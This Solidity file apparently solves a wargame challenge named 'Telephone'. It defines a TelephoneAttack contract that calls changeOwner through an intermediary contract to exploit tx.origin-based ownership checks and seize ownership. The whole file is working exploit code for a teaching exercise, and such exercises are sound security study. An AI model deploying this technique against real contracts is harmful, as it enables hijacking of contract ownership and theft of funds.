pragma solidity ^0.8.0;

interface Telephone {
  function changeOwner(address _owner) external;
}

contract TelephoneAttack {
  
  Telephone public tele;

  constructor(address TelephoneAddress) public {
    tele = Telephone(TelephoneAddress);
  }

  function sendTx(address newOwner) public {
    tele.changeOwner(newOwner);
  }
}
